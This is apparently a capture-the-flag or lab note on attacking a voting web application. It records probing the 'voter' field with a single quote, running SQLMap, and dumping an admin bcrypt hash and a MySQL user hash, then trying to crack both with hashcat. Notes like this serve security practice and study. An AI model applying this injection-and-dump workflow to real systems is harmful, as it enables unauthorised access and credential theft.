# SQL injection
* Setting voter to a single quote (') yields an interesting response

![[Pasted image 20210605182433.png]]
* This means it's probably vulnerable to SQL injection, try running SQLMap on it

```sql
Database: votesystem
Table: admin
[1 entry]
+----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+
| id | photo                       | lastname | password                                                     | username | firstname | created_on |
+----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+
| 1  | facebook-profile-image.jpeg | Devierte | $2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC | admin    | Neovic    | 2018-04-02 |
+----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+

```
* SQLMap leaks a password hash for user admin
	* This is a bcrypt hash, try cracking with hashcat
		* Hashcat determines it would be a ~3 day wait to crack hash -> dead end
* SQLMap leaks another password hash:
```sql
database management system users password hashes:
[*] pheobe [1]:
    password hash: NULL
[*] phoebe [1]:
    password hash: *8011380027B5ACED186B2FF99181FE050E5CA7A8
[*] pma [1]:
    password hash: NULL
[*] root [1]:
    password hash: NULL
```
* Couldn't crack this hash using rockyou and a couple simple hashcat rules 